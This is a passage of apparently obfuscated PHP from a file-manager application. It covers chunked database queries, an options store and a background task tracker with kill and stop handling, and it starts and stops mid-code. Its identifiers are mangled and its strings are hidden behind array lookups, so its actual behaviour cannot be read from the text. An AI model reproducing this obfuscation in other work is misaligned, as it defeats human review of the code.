$this->_parseOptions($…Âğ‰¼Ì); foreach ($€ÔğŸ¦ as $ÕÌÅ¾×¼ => $¿§—Ûø ) { $€ÔğŸ¦[$ÕÌÅ¾×¼] = $this->_facade($¿§—Ûø ); $this->_beforeInsert($€ÔğŸ¦[$ÕÌÅ¾×¼], $…Âğ‰¼Ì); } if (method_exists($this->db, $”¹õ·–[310])) { for ($¯“ó”Ó€ = 0; $¯“ó”Ó€ < count($€ÔğŸ¦); $¯“ó”Ó€ += $ÁÇ•Úµë) { $šøÔœï = array_slice($€ÔğŸ¦, $¯“ó”Ó€, $ÁÇ•Úµë); if (!is_array($šøÔœï) || count($šøÔœï) == 0) { break; } $ğÍÈ•Ÿä = $this->db->insertAll($šøÔœï, $…Âğ‰¼Ì, $¶ÀÓìÄÖ); $this->chunkEventCheck(count($šøÔœï)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($€ÔğŸ¦ as $ÕÌÅ¾×¼ => $¿§—Ûø ) { $ğÍÈ•Ÿä = $this->db->insert($¿§—Ûø , $…Âğ‰¼Ì, $¶ÀÓìÄÖ); } $this->commit(); } if (!1 !== $ğÍÈ•Ÿä) { $ø¿¤ÎÇ¯ = $this->getLastInsID(); if ($ø¿¤ÎÇ¯) { return $ø¿¤ÎÇ¯; } } return $ğÍÈ•Ÿä; } public function save($‚ì¿«²œ = '', $íğ¸í÷Â = array()) { $ÇÀŒÎİí =& $_SERVER[ªÏ§Ë·]; $è·Ğ®³» = self::SQL_WHERE_IN_CHUNK; $¥®±ùÏÀ = $this->optionsValue(); $ú¢ÙøÒ = $this->findWhereField($¥®±ùÏÀ); if (!$ú¢ÙøÒ) { return parent::save($‚ì¿«²œ, $íğ¸í÷Â); } $Ì‹†³Ê¡ = 0; $ô²ÎıæÏ = $¥®±ùÏÀ[$ÇÀŒÎİí[313]][$ú¢ÙøÒ][1]; $ô²ÎıæÏ = is_array($ô²ÎıæÏ) ? $ô²ÎıæÏ : array(); $ğ£ÆÄ¹Š = count($ô²ÎıæÏ); for ($çÔ€™«” = 0; $çÔ€™«” < $ğ£ÆÄ¹Š; $çÔ€™«” += $è·Ğ®³») { $üÒ’Ş“Ó = array_slice($ô²ÎıæÏ, $çÔ€™«”, $è·Ğ®³»); if (!is_array($üÒ’Ş“Ó) || count($üÒ’Ş“Ó) == 0) { break; } $¥®±ùÏÀ[$ÇÀŒÎİí[313]][$ú¢ÙøÒ][1] = $üÒ’Ş“Ó; $this->optionsValue($¥®±ùÏÀ); $Ì‹†³Ê¡ += parent::save($‚ì¿«²œ, $íğ¸í÷Â); $this->chunkEventCheck(count($üÒ’Ş“Ó)); } $this->chunkEventSet(); return $Ì‹†³Ê¡; } public function add($êş¬¥ÛÎ = '', $âü¨ì„ú = array(), $°öò¹¦Ù = false) { if ($this->addTaskStatus && is_array($êş¬¥ÛÎ)) { $this->addTaskData[] = $êş¬¥ÛÎ; return; } return parent::add($êş¬¥ÛÎ, $âü¨ì„ú, $°öò¹¦Ù); } public function parseWhereLike($ÕÄ€Ù®, $•˜¹øĞ = '', $ÈóÍí‘¡ = false, &$ß›éü›ş = false) { $°÷íúÈ´ =& $_SERVER[ªÏ§Ë·]; $‰Ü½“Á¨ = $GLOBALS[$°÷íúÈ´[6]][$°÷íúÈ´[419]]; if (!$‰Ü½“Á¨[$°÷íúÈ´[420]]) { return $ÕÄ€Ù®; } if (!is_array($ÕÄ€Ù®)) { return $ÕÄ€Ù®; } $•¥îƒî = array(); $­”ØĞ¥ = 0; foreach ($ÕÄ€Ù® as $Ù…èÚ¥À => $‚šÂ¦”Ê) { if (is_array($‚šÂ¦”Ê) && count($‚šÂ¦”Ê) == 2 && $‚šÂ¦”Ê[0] == $°÷íúÈ´[421] && is_string($‚šÂ¦”Ê[1]) && substr($‚šÂ¦”Ê[1], 0, 1) == $°÷íúÈ´[422] && substr($‚šÂ¦”Ê[1], strlen($‚šÂ¦”Ê[1]) - 1, 1) == $°÷íúÈ´[422]) { $ß›éü›ş = !0; $°óä‘ = is_string($Ù…èÚ¥À) ? $Ù…èÚ¥À : $•˜¹øĞ; $†Ó®äÎ„ = substr($‚šÂ¦”Ê[1], 1, strlen($‚šÂ¦”Ê[1]) - 2); $†Ó®äÎ„ = $this->db->escapeString($†Ó®äÎ„); if (!strpos($°óä‘, $°÷íúÈ´[10])) { $°óä‘ = $°÷íúÈ´[423] . $°óä‘ . $°÷íúÈ´[423]; } $ÑÑ©ş‡† = $°÷íúÈ´[199] . $†Ó®äÎ„ . $°÷íúÈ´[199]; $†Ó®äÎ„ = str_replace(array($°÷íúÈ´[10], $°÷íúÈ´[424], $°÷íúÈ´[11]), $°÷íúÈ´[425], $†Ó®äÎ„); if ($‰Ü½“Á¨[$°÷íúÈ´[426]]) { $ÑÑ©ş‡† = $°÷íúÈ´[427] . $†Ó®äÎ„ . $°÷íúÈ´[428]; if ($‰Ü½“Á¨[$°÷íúÈ´[429]]) { $ÑÑ©ş‡† = $°÷íúÈ´[428] . $†Ó®äÎ„ . $°÷íúÈ´[427]; } } $•¥îƒî[$­”ØĞ¥] = $°÷íúÈ´[430] . $°óä‘ . $°÷íúÈ´[431] . $ÑÑ©ş‡† . $°÷íúÈ´[432]; $­”ØĞ¥++; continue; } if (is_array($‚šÂ¦”Ê)) { $•˜¹øĞ = is_string($Ù…èÚ¥À) ? $Ù…èÚ¥À : $•˜¹øĞ; $‚šÂ¦”Ê = $this->parseWhereLike($‚šÂ¦”Ê, $•˜¹øĞ, !0, $ß›éü›ş); } if (is_numeric($Ù…èÚ¥À)) { $•¥îƒî[$­”ØĞ¥] = $‚šÂ¦”Ê; $­”ØĞ¥++; } else { $•¥îƒî[$Ù…èÚ¥À] = $‚šÂ¦”Ê; } } if ($ß›éü›ş && !$ÈóÍí‘¡) { } return $•¥îƒî; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ò¤ÒÇš = array()) { $‚†ù¼Òò =& $_SERVER[ªÏ§Ë·]; $…ù°éÙ© = self::SQL_WHERE_IN_CHUNK; $ÈÅî¿å = $this->optionsValue(); $­‹»¼®¹ = $this->findWhereField($ÈÅî¿å); if (!$­‹»¼®¹ || isset($ÈÅî¿å[$‚†ù¼Òò[330]]) || isset($ÈÅî¿å[$‚†ù¼Òò[391]])) { return parent::select($ò¤ÒÇš); } $Ú†Ü¤½ = $ÈÅî¿å[$‚†ù¼Òò[313]][$­‹»¼®¹][1]; $Ú†Ü¤½ = is_array($Ú†Ü¤½) ? $Ú†Ü¤½ : array(); $‡ÌıÒİç = null; for ($‹äËÚÊ = 0; $‹äËÚÊ < count($Ú†Ü¤½); $‹äËÚÊ += $…ù°éÙ©) { $½¨¤İñ· = array_slice($Ú†Ü¤½, $‹äËÚÊ, $…ù°éÙ©); if (!is_array($½¨¤İñ·) || count($½¨¤İñ·) == 0) { break; } $ÈÅî¿å[$‚†ù¼Òò[313]][$­‹»¼®¹][1] = $½¨¤İñ·; $this->optionsValue($ÈÅî¿å); $¥›Ş”Îï = parent::select($ò¤ÒÇš); if (!$¥›Ş”Îï) { continue; } $‡ÌıÒİç = is_array($‡ÌıÒİç) ? $‡ÌıÒİç : array(); $‡ÌıÒİç = array_merge($‡ÌıÒİç, $¥›Ş”Îï); } return $‡ÌıÒİç; } public function delete($Í—ñ€äó = array()) { $³öİšŒÌ =& $_SERVER[ªÏ§Ë·]; $Ş£Œ§ş = self::SQL_WHERE_IN_CHUNK; $ü”Ğ‡Œ½ = $this->optionsValue(); $‡¢Œ¦¥¡ = $this->findWhereField($ü”Ğ‡Œ½); if (!$‡¢Œ¦¥¡) { return parent::delete($Í—ñ€äó); } $Ãğ­È¥ = 0; $²£Ûé¿‘ = $ü”Ğ‡Œ½[$³öİšŒÌ[313]][$‡¢Œ¦¥¡][1]; $²£Ûé¿‘ = is_array($²£Ûé¿‘) ? $²£Ûé¿‘ : array(); for ($„§“Îµ = 0; $„§“Îµ < count($²£Ûé¿‘); $„§“Îµ += $Ş£Œ§ş) { $ã¥’§ï = array_slice($²£Ûé¿‘, $„§“Îµ, $Ş£Œ§ş); if (!is_array($ã¥’§ï) || count($ã¥’§ï) == 0) { break; } $ü”Ğ‡Œ½[$³öİšŒÌ[313]][$‡¢Œ¦¥¡][1] = $ã¥’§ï; $this->optionsValue($ü”Ğ‡Œ½); $Ãğ­È¥ += parent::delete($Í—ñ€äó); } return $Ãğ­È¥; } private function findWhereField($˜„´ÈÖº) { $áñÓ¦½¨ =& $_SERVER[ªÏ§Ë·]; $¥¯Ÿø×ï = self::SQL_WHERE_IN_CHUNK; if (!is_array($˜„´ÈÖº) || !is_array($˜„´ÈÖº[$áñÓ¦½¨[313]])) { return !1; } foreach ($˜„´ÈÖº[$áñÓ¦½¨[313]] as $ÃÔğ×‚ => $Á×˜Š¶Ö) { if (is_array($Á×˜Š¶Ö) && isset($Á×˜Š¶Ö[0]) && is_string($Á×˜Š¶Ö[0]) && strtolower($Á×˜Š¶Ö[0]) == $áñÓ¦½¨[7] && is_array($Á×˜Š¶Ö[1]) && count($Á×˜Š¶Ö[1]) > $¥¯Ÿø×ï) { ignore_timeout(); return $ÃÔğ×‚; } } return !1; } public function setMasterDB($šˆ©¬À³ = true) { think_config($_SERVER[ªÏ§Ë·][433], $šˆ©¬À³); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\155\x4f\x70\x74\151\x6f\156"; public $field = array(); public function listData($ÔªÄùş = false, $ôËªîØ¾ = "\155\157\x64\x69\x66\x79\x54\151\155\145", $¶×ëÌÏĞ = false) { $‘àõİü = Model($this->modelType)->get(!1, $this->optionType, !0); $ÍäÀ–ş‡ = array_values($‘àõİü); if ($ÍäÀ–ş‡ && $ÍäÀ–ş‡[0] && !is_array($ÍäÀ–ş‡[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‘àõİü = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‘àõİü) { return $ÔªÄùş ? null : array(); } if (!$ÔªÄùş) { $‘àõİü = array_filter(array_values($‘àõİü)); return array_sort_by($‘àõİü, $ôËªîØ¾, $¶×ëÌÏĞ); } return $‘àõİü[$_SERVER[ªÏ§Ë·][434] . $ÔªÄùş]; } public function insert($¥‡à¸Â) { $ÙÛÕÒğ‰ =& $_SERVER[ªÏ§Ë·]; $¥‡à¸Â = array_field_key($¥‡à¸Â, $this->field); $’ÍÔ“ = Model($this->modelType)->get($ÙÛÕÒğ‰[435], $this->optionType . $ÙÛÕÒğ‰[436]); $’ÍÔ“ = $’ÍÔ“ ? $’ÍÔ“ : 0; $¥‡à¸Â[$ÙÛÕÒğ‰[437]] = ++$’ÍÔ“; $¥‡à¸Â[$ÙÛÕÒğ‰[211]] = time(); $¥‡à¸Â[$ÙÛÕÒğ‰[95]] = time(); Model($this->modelType)->set($ÙÛÕÒğ‰[435], $’ÍÔ“, $this->optionType . $ÙÛÕÒğ‰[436]); Model($this->modelType)->set($ÙÛÕÒğ‰[434] . $’ÍÔ“, $¥‡à¸Â, $this->optionType); return $’ÍÔ“; } public function update($Š„¹¼ã•, $ÚÑ•Î˜) { $Ÿ§ï³² =& $_SERVER[ªÏ§Ë·]; $ÚÑ•Î˜ = array_field_key($ÚÑ•Î˜, $this->field); $Æ¼ñÚÈÏ = $this->listData($Š„¹¼ã•); if (!$Æ¼ñÚÈÏ || !$Š„¹¼ã•) { return !1; } $ÚÑ•Î˜ = array_merge($Æ¼ñÚÈÏ, $ÚÑ•Î˜); $ÚÑ•Î˜[$Ÿ§ï³²[95]] = time(); return Model($this->modelType)->set($Ÿ§ï³²[434] . $Š„¹¼ã•, $ÚÑ•Î˜, $this->optionType); } public function remove($ñÔÑÃ ó) { if (!$ñÔÑÃ ó) { return !1; } return Model($this->modelType)->remove($_SERVER[ªÏ§Ë·][434] . $ñÔÑÃ ó, $this->optionType); } public function clear() { $‹Õ™ºÌ =& $_SERVER[ªÏ§Ë·]; Model($this->modelType)->remove($‹Õ™ºÌ[435], $this->optionType . $‹Õ™ºÌ[436]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Á±òñˆò, $Ê¤İà×) { if (!$Ê¤İà×) { return !1; } $¾Ëüáä = $this->listData(); $¾Ëüáä = array_to_keyvalue($¾Ëüáä, $Á±òñˆò); return isset($¾Ëüáä[$Ê¤İà×]) ? $¾Ëüáä[$Ê¤İà×] : !1; } public function findByName($šÓäÒˆ) { return $this->findByKey($_SERVER[ªÏ§Ë·][42], $šÓäÒˆ); } protected function resetData($ÈÅìææğ) { $‡—Ó¡ =& $_SERVER[ªÏ§Ë·]; $ÈÅìææğ = is_array($ÈÅìææğ) ? $ÈÅìææğ : array(); $Ìƒ£ŒÏê = array(); for ($ñ‚ÕÛ— = 0; $ñ‚ÕÛ— < count($ÈÅìææğ); $ñ‚ÕÛ—++) { $Ìƒ£ŒÏê[$‡—Ó¡[434] . $ÈÅìææğ[$ñ‚ÕÛ—][$‡—Ó¡[437]]] = $ÈÅìææğ[$ñ‚ÕÛ—]; } return Model($this->modelType)->set($Ìƒ£ŒÏê, !1, $this->optionType); } private function getAutoName($Ë¹¯ß†Û) { $öÑÂèï = array_to_keyvalue($this->listData(), $_SERVER[ªÏ§Ë·][42]); if (!$öÑÂèï || !isset($öÑÂèï[$Ë¹¯ß†Û])) { return $Ë¹¯ß†Û; } for ($¢Ò‡—ë = 1; $¢Ò‡—ë < count($öÑÂèï); $¢Ò‡—ë++) { $¯÷Ë’†— = $Ë¹¯ß†Û . "\50{$¢Ò‡—ë}\x29"; if (!isset($öÑÂèï[$¯÷Ë’†—])) { return $¯÷Ë’†—; } } return $¯÷Ë’†—; } } goto Eæßõ³†‚¡; d…†Ìù¡“´: class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\165\156\156\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($™©Û¸àû, $Œ†¦Ş = '', $•ˆıŞôì = 0, $÷ŒÄ»âß = '') { $š«ˆÍÂ =& $_SERVER[ªÏ§Ë·]; if (self::get($™©Û¸àû)) { return; } $this->task = array($š«ˆÍÂ[437] => $™©Û¸àû, $š«ˆÍÂ[1667] => USER_ID, $š«ˆÍÂ[1567] => $÷ŒÄ»âß, $š«ˆÍÂ[491] => $š«ˆÍÂ[12], $š«ˆÍÂ[43] => $Œ†¦Ş, $š«ˆÍÂ[1089] => $š«ˆÍÂ[12], $š«ˆÍÂ[814] => $•ˆıŞôì, $š«ˆÍÂ[1668] => 0, $š«ˆÍÂ[1669] => 0, $š«ˆÍÂ[1670] => 0, $š«ˆÍÂ[1671] => timeFloat(), $š«ˆÍÂ[1672] => 0, $š«ˆÍÂ[1673] => 0, $š«ˆÍÂ[1674] => 0, $š«ˆÍÂ[1675] => 0, $š«ˆÍÂ[778] => $š«ˆÍÂ[1626]); $GLOBALS[$š«ˆÍÂ[1676]] = 1; Hook::bind($š«ˆÍÂ[1631], array($this, $š«ˆÍÂ[1677])); Hook::bind($š«ˆÍÂ[1678], array($this, $š«ˆÍÂ[1679])); $this->startAfter(); Hook::trigger($š«ˆÍÂ[1680], $this->task); $this->task[$š«ˆÍÂ[1673]] = timeFloat(); } public function end($ìÅ‘ı¢Ï = '') { $ñšùÅ§ =& $_SERVER[ªÏ§Ë·]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ñšùÅ§[1673]]) { self::valueSet($this->task[$ñšùÅ§[437]], !1); } $this->isEnd = !0; if ($ìÅ‘ı¢Ï) { $this->task[$ñšùÅ§[491]] = $ìÅ‘ı¢Ï; } self::log($ñšùÅ§[1681] . $this->task[$ñšùÅ§[437]] . $ñšùÅ§[1682] . sprintf($ñšùÅ§[878], timeFloat() - $this->task[$ñšùÅ§[1671]]) . $ñšùÅ§[1683]); Hook::unbind($ñšùÅ§[1631], array($this, $ñšùÅ§[1677])); Hook::unbind($ñšùÅ§[1678], array($this, $ñšùÅ§[1679])); $this->endAfter(); $¸‰“íáœ = $this->task; $this->task = !1; Hook::trigger($ñšùÅ§[1684], $¸‰“íáœ); } public function update($ÁæŒûœì = 0, $®À‘½Ú = false) { $öÂ˜ú•ì =& $_SERVER[ªÏ§Ë·]; $®ìŞä§· =& $this->task; if (!$®ìŞä§·) { return; } $®ìŞä§·[$öÂ˜ú•ì[1668]] += $ÁæŒûœì; $®ìŞä§·[$öÂ˜ú•ì[1672]] = timeFloat(); if ($®ìŞä§·[$öÂ˜ú•ì[814]]) { if ($®ìŞä§·[$öÂ˜ú•ì[814]] < $®ìŞä§·[$öÂ˜ú•ì[1668]]) { $®ìŞä§·[$öÂ˜ú•ì[814]] = $®ìŞä§·[$öÂ˜ú•ì[1668]]; } $ã€ã‘™Ñ = timeFloat() - $®ìŞä§·[$öÂ˜ú•ì[1671]] - $®ìŞä§·[$öÂ˜ú•ì[1674]]; if ($ã€ã‘™Ñ <= 0) { $ã€ã‘™Ñ = 0.001; } $®ìŞä§·[$öÂ˜ú•ì[1669]] = $®ìŞä§·[$öÂ˜ú•ì[1668]] / $®ìŞä§·[$öÂ˜ú•ì[814]]; $®ìŞä§·[$öÂ˜ú•ì[1670]] = $®ìŞä§·[$öÂ˜ú•ì[1668]] / $ã€ã‘™Ñ; if ($®ìŞä§·[$öÂ˜ú•ì[1669]] > 0) { $®ìŞä§·[$öÂ˜ú•ì[1675]] = $ã€ã‘™Ñ * (1 - $®ìŞä§·[$öÂ˜ú•ì[1669]]) / $®ìŞä§·[$öÂ˜ú•ì[1669]]; } $®ìŞä§·[$öÂ˜ú•ì[1675]] = $®ìŞä§·[$öÂ˜ú•ì[1675]] <= 0 ? 0 : $®ìŞä§·[$öÂ˜ú•ì[1675]]; } $this->updateAfter(); $ÒÚ·¾Ù = 0.2; if (timeFloat() - $®ìŞä§·[$öÂ˜ú•ì[1673]] < $ÒÚ·¾Ù && !$®À‘½Ú) { return; } $°øêŠıİ = self::get($®ìŞä§·[$öÂ˜ú•ì[437]]); $µ¡¥ã‘ = $°øêŠıİ[$öÂ˜ú•ì[778]]; if ($µ¡¥ã‘ == self::STATYS_KILL) { $ö—·Ã–£ = array($öÂ˜ú•ì[1685] => LNG($öÂ˜ú•ì[1686]), $öÂ˜ú•ì[1237] => !1); Cache::set($öÂ˜ú•ì[1687] . $this->task[$öÂ˜ú•ì[437]], $ö—·Ã–£, 30); $this->onKill(); $this->end(); die; } else { if ($µ¡¥ã‘ == self::STATYS_STOP) { $êÊ«ëí = 2; $°øêŠıİ[$öÂ˜ú•ì[1674]] += $êÊ«ëí; self::valueSet($®ìŞä§·[$öÂ˜ú•ì[437]], $°øêŠıİ); sleep($êÊ«ëí); $this->update(); return; } } $®ìŞä§·[$öÂ˜ú•ì[778]] = $µ¡¥ã‘ ? $µ¡¥ã‘ : $®ìŞä§·[$öÂ˜ú•ì[778]]; $®ìŞä§·[$öÂ˜ú•ì[1674]] = $°øêŠıİ[$öÂ˜ú•ì[1674]] ? $°øêŠıİ[$öÂ˜ú•ì[1674]] : 0; $®ìŞä§·[$öÂ˜ú•ì[1673]] = timeFloat(); Hook::trigger($öÂ˜ú•ì[1688], $®ìŞä§·); self::valueSet($®ìŞä§·[$öÂ˜ú•ì[437]], $®ìŞä§·); } public function onKillSet($ù·¡Óı‡, $çò¯÷µ = array()) { $this->onKillCall = array($ù·¡Óı‡, $çò¯÷µ); } public function onKill() { $ÔŒÄ¿Ãº =& $_SERVER[ªÏ§Ë·]; self::log($ÔŒÄ¿Ãº[1681] . $this->task[$ÔŒÄ¿Ãº[437]] . $ÔŒÄ¿Ãº[1689]); Hook::trigger($ÔŒÄ¿Ãº[1690], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ïú¶‹¶«) { $ˆÇ˜÷—‡ =& $_SERVER[ªÏ§Ë·]; Cache::set($ˆÇ˜÷—‡[1687] . $this->task[$ˆÇ˜÷—‡[437]], $Ïú¶‹¶«, 60); return $Ïú¶‹¶«; } public static function get($èã÷Ãƒ) { $ö–±Öæ =& $_SERVER[ªÏ§Ë·]; $Ö¦¦¹Ï = self::valueGet($èã÷Ãƒ); if (is_array($Ö¦¦¹Ï) && $Ö¦¦¹Ï[$ö–±Öæ[1691]]) { $œ¹ÒÊ®à = ActionApply($Ö¦¦¹Ï[$ö–±Öæ[1691]], array($Ö¦¦¹Ï)); $Ö¦¦¹Ï = is_array($œ¹ÒÊ®à) ? $œ¹ÒÊ®à : $Ö¦¦¹Ï; } return $Ö¦¦¹Ï; } public static function listData() { $ŠæÒ¦³¥ = self::valueGet(); return array_sort_by($ŠæÒ¦³¥, $_SERVER[ªÏ§Ë·][1671], !0); } public static function kill($Î½ĞŸ¯Æ) { return self::changeStatus($Î½ĞŸ¯Æ, self::STATYS_KILL); } public static function stop($ÃÕš­»î) { return self::changeStatus($ÃÕš­»î, self::STATYS_STOP); } public static function restart($ÍÈ ğ©) { return self::changeStatus($ÍÈ ğ©, self::STATYS_RUNNING); } public static function killAll() { $ñã× å =& $_SERVER[ªÏ§Ë·]; $²€²æØ¾ = self::listData(); foreach ($²€²æØ¾ as $öÜú‘ç–) { self::kill($öÜú‘ç–[$ñã× å[437]]); } sleep(2); foreach ($²€²æØ¾ as $öÜú‘ç–) { self::valueSet($öÜú‘ç–[$ñã× å[437]], !1); } } private static function changeStatus($‘ØáÕØ, $š¬Š©Ğ‹) { $³Ì›“Øœ =& $_SERVER[ªÏ§Ë·]; $øÛ§øŸ‡ = self::valueGet($‘ØáÕØ); if (!$øÛ§øŸ‡) { return !1; } $øÛ§øŸ‡[$³Ì›“Øœ[778]] = $š¬Š©Ğ‹; self::valueSet($‘ØáÕØ, $øÛ§øŸ‡); self::log($³Ì›“Øœ[1692] . $øÛ§øŸ‡[$³Ì›“Øœ[437]] . $³Ì›“Øœ[1693] . $š¬Š©Ğ‹); return !0; } public static function valueGet($¨­º†üÚ = false) { $ı‚÷å¾Ì =& $_SERVER[ªÏ§Ë·]; if ($¨­º†üÚ) { $ààúÔèÔ = Model($ı‚÷å¾Ì[485])->where(array($ı‚÷å¾Ì[104] => $¨­º†üÚ, $ı‚÷å¾Ì[43] => $ı‚÷å¾Ì[1096]))->find(); return $ààúÔèÔ ? json_decode($ààúÔèÔ[$ı‚÷å¾Ì[412]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ã´§úÇ’ = false) { $›ªËÖà =& $_SERVER[ªÏ§Ë·]; $àÅÃ¿Ó = array($›ªËÖà[43] => $›ªËÖà[1096]); if ($Ã´§úÇ’) { $àÅÃ¿Ó[$›ªËÖà[1667]] = $Ã´§úÇ’; } $É¼¾¶Í = Model($›ªËÖà[485])->where($àÅÃ¿Ó)->select(); $É¼¾¶Í = $É¼¾¶Í ? $É¼¾¶Í : array(); foreach ($É¼¾¶Í as $Ò·»Ûí => $ëÑÕæ°) { $É¼¾¶Í[$Ò·»Ûí] = json_decode($ëÑÕæ°[$›ªËÖà[412]], !0); } return $É¼¾¶Í; } public static function valueSet($Â±ğĞØÍ, $‹æŸ£¯€) { $Ç¿ĞÇß† =& $_SERVER[ªÏ§Ë·]; if (!$‹æŸ£¯€) { return Model($Ç¿ĞÇß†[485])->where(array($Ç¿ĞÇß†[104] => $Â±ğĞØÍ, $Ç¿ĞÇß†[43] => $Ç¿ĞÇß†[1096]))->delete(); } $ªíåâ‚¿ = json_encode($‹æŸ£¯€); if (!$ªíåâ‚¿) { ob_start(); var_dump($‹æŸ£¯€); $¹Ø°¨ºš = ob_get_clean(); self::log($Ç¿ĞÇß†[1694] . json_encode_force($¹Ø°¨ºš)); } if (!$Â±ğĞØÍ || !$‹æŸ£¯€[$Ç¿ĞÇß†[437]]) { return !1; } $Ş¾€ºâÃ = array($Ç¿ĞÇß†[43] => $Ç¿ĞÇß†[1096], $Ç¿ĞÇß†[1667] => USER_ID, $Ç¿ĞÇß†[104] => $Â±ğĞØÍ, $Ç¿ĞÇß†[412] => $ªíåâ‚¿); $ÇİíÅ÷© = $Ç¿ĞÇß†[1695]; CacheLock::lock($ÇİíÅ÷©); Model($Ç¿ĞÇß†[485])->add($Ş¾€ºâÃ, array(), !0); CacheLock::unlock($ÇİíÅ÷©); } public static function log($ûÖàùÜ±) { if (!GLOBAL_DEBUG) { return; } write_log($ûÖàùÜ±, $_SERVER[ªÏ§Ë·][1696]); } } class TaskFileTransfer extends Task { protected function startAfter() { $á”Ç² =& $_SERVER[ªÏ§Ë·]; $úçõ¨ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($á”Ç²[1697], array($this, $á”Ç²[1698])); Hook::bind($á”Ç²[1248], array($this, $á”Ç²[1699])); Hook::bind($á”Ç²[1700], array($this, $á”Ç²[1701])); Hook::bind($á”Ç²[634], array($this, $á”Ç²[1702])); Hook::bind($á”Ç²[635], array($this, $á”Ç²[1703])); Hook::bind($á”Ç²[640], array($this, $á”Ç²[1704])); Hook::bind($á”Ç²[641], array($this, $á”Ç²[1705])); Hook::bind($á”Ç²[637], array($this, $á”Ç²[1706])); Hook::bind($á”Ç²[638], array($this, $á”Ç²[1707])); Hook::bind($á”Ç²[603], array($this, $á”Ç²[1708])); Hook::bind($á”Ç²[600], array($this, $á”Ç²[1708])); Hook::bind($á”Ç²[605], array($this, $á”Ç²[1708])); Hook::bind($á”Ç²[607], array($this, $á”Ç²[1708])); Hook::bind($á”Ç²[609], array($this, $á”Ç²[1708])); Hook::bind($á”Ç²[1709], array($this, $á”Ç²[1710])); Hook::bind($á”Ç²[625], array($this, $á”Ç²[1711])); $this->sourceModelCopyFlag = !1; Hook::bind($á”Ç²[1712], array($this, $á”Ç²[1713])); Hook::bind($á”Ç²[1714], array($this, $á”Ç²[1715])); Hook::bind($á”Ç²[1716], array($this, $á”Ç²[1717])); $úçõ¨[$á”Ç²[1718]] = LNG($á”Ç²[1719]); $úçõ¨[$á”Ç²[1720]] = 0; $úçõ¨[$á”Ç²[1721]] = 0; $úçõ¨[$á”Ç²[1089]] = $á”Ç²[12]; $úçõ¨[$á”Ç²[1722]] = $á”Ç²[12]; $úçõ¨[$á”Ç²[1723]] = 0; $úçõ¨[$á”Ç²[1724]] = 0; $úçõ¨[$á”Ç²[1725]] = 0; if (!$úçõ¨[$á”Ç²[1567]]) { $úçõ¨[$á”Ç²[1567]] = LNG($á”Ç²[1726]); } } protected function endAfter() { $¢ìé²µ© =& $_SERVER[ªÏ§Ë·]; Hook::unbind($¢ìé²µ©[1697], array($this, $¢ìé²µ©[1698])); Hook::unbind($¢ìé²µ©[1248], array($this, $¢ìé²µ©[1699])); Hook::unbind($¢ìé²µ©[1700], array($this, $¢ìé²µ©[1701])); Hook::unbind($¢ìé²µ©[634], array($this, $¢ìé²µ©[1702])); Hook::unbind($¢ìé²µ©[635], array($this, $¢ìé²µ©[1703])); Hook::unbind($¢ìé²µ©[640], array($this, $¢ìé²µ©[1704])); Hook::unbind($¢ìé²µ©[641], array($this, $¢ìé²µ©[1705])); Hook::unbind($¢ìé²µ©[637], array($this, $¢ìé²µ©[1706])); Hook::unbind($¢ìé²µ©[638], array($this, $¢ìé²µ©[1707])); Hook::unbind($¢ìé²µ©[603], array($this, $¢ìé²µ©[1708])); Hook::unbind($¢ìé²µ©[600], array($this, $¢ìé²µ©[1708])); Hook::unbind($¢ìé²µ©[605], array($this, $¢ìé²µ©[1708])); Hook::unbind($¢ìé²µ©[607], array($this, $¢ìé²µ©[1708])); Hook::unbind($¢ìé²µ©[609], array($this, $¢ìé²µ©[1708])); Hook::unbind($¢ìé²µ©[1709], array($this, $¢ìé²µ©[1710])); Hook::unbind($¢ìé²µ©[625], array($this, $¢ìé²µ©[1711])); Hook::unbind($¢ìé²µ©[1712], array($this, $¢ìé²µ©[1713])); Hook::unbind($¢ìé²µ©[1714], array($this, $¢ìé²µ©[1715])); Hook::unbind($¢ìé²µ©[1716], array($this, $¢ìé²µ©[1717])); } public function copyMoveStart($İÂ‘ÎßÆ, $Ò«Ë°ÂÁ, $—ÑÓ­ï¹, $Ùª†à») { $Š÷ • =& $_SERVER[ªÏ§Ë·]; self::log($Š÷ •[1727] . $Ò«Ë°ÂÁ . $Š÷ •[80] . $Ùª†à»); $ÍÚŠ™öğ = rtrim(TEMP_FILES, $Š÷ •[8]); if (substr($Ò«Ë°ÂÁ, 0, strlen($ÍÚŠ™öğ)) == $ÍÚŠ™öğ) { return; } if (substr($Ùª†à», 0, strlen($ÍÚŠ™öğ)) == $ÍÚŠ™öğ) { return; } $°”óÄ¢¦ =& $this->task; $°”óÄ¢¦[$Š÷ •[1728]] = KodIO::transferType($İÂ‘ÎßÆ, $—ÑÓ­ï¹); $this->update(); } public function updateAfter() { $¯‹ËÕùÏ =& $_SERVER[ªÏ§Ë·]; $ÉÈ©À× =& $this->task; if (!$ÉÈ©À×[$¯‹ËÕùÏ[791]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÉÈ©À×[$¯‹ËÕùÏ[1728]] == $¯‹ËÕùÏ[1340]) { return; } self::updateTask($ÉÈ©À×); } private static function updateTask(&$‡ËÓš¤¶) { $ÌºŞ³”¸ =& $_SERVER[ªÏ§Ë·]; if ($‡ËÓš¤¶[$ÌºŞ³”¸[1728]] == $ÌºŞ³”¸[1219] || 